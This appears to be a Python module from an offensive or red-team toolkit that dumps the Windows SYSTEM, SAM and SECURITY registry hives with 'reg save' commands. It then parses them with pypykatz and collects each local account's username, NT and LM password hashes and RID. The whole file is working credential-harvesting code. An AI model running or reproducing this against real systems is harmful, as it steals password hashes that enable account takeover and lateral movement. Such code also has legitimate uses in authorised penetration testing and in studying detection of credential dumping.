from pypykatz.registry.offline_parser import OffineRegistry
import subprocess
import json
import os

class sam:
    def __init__(self):
        self.output='./output/'
        self.system_hive_filename="system.hive"
        self.sam_hive_filename="sam.hive"
        self.security_hive_filename="security.hive"
        self.result_filename="sam_result.json"
        self.pypykatz=".\\pypykatz\\pypykatz"
    
    def dump_hive(self):
        system_hive_path=self.output+self.system_hive_filename
        sam_hive_path=self.output+self.sam_hive_filename
        security_hive_path=self.output+self.security_hive_filename
        
        save_system_command="reg save hklm\\system {filename} -y".format(filename=system_hive_path)
        run_save_system=subprocess.Popen(args=save_system_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=True)
        run_save_system.communicate()

        save_sam_command="reg save hklm\\sam {filename} -y".format(filename=sam_hive_path)
        run_save_sam=subprocess.Popen(args=save_sam_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=True)
        run_save_sam.communicate()

        save_security_command="reg save hklm\\security {filename} -y".format(filename=security_hive_path)
        run_save_security=subprocess.Popen(args=save_security_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=True)
        run_save_security.communicate()

        if os.path.isfile(system_hive_path) and os.path.isfile(sam_hive_path) and os.path.isfile(security_hive_path):
            system_size=os.path.getsize(system_hive_path)
            sam_size=os.path.getsize(sam_hive_path)
            security_size=os.path.getsize(security_hive_path)

            if system_size==0 and sam_size==0 and security_size==0:
                return False
            else:
                return True
        else:
            return False

    def get_secret_data(self,secret_data_json):
        '''
        with open(secret_file, 'r') as json_file:
            json_data=json.load(json_file)
        '''
        json_data=json.loads(secret_data_json)
        secret_data=[]
        for item in json_data['SAM']['local_users']:
            secret_data.append(item)
        return secret_data

    def get_result(self,target_name,login_data):
        desc=target_name+" Secret Data"
        result={}
        result['desc']=desc
        data=[]
        for item in login_data:
            data_item={}
            data_item['username']=item['username']
            data_item['nt_hash']=item['nt_hash']
            data_item['lm_hash']=item['lm_hash']
            data_item['rid']=item['rid']
            data.append(data_item)
        result['data']=data
        return result            

    def run(self,target_list):
        result=[]
        if 'sam' in target_list:
            res=self.dump_hive()
            if res:
                try:
                    system_hive=self.output+self.system_hive_filename
                    sam_hive=self.output+self.sam_hive_filename
                    security_hive=self.output+self.security_hive_filename
                    or_result = OffineRegistry.from_files(system_hive,sam_hive,security_hive)
                    or_result_json=or_result.to_json()
                    secret_data=self.get_secret_data(or_result_json)
                    sam_result=self.get_result('SAM',secret_data)
                    result.append(sam_result)
                except Exception as e:
                    pass
            else:
                print('[-]Insufficient permissions')
        return result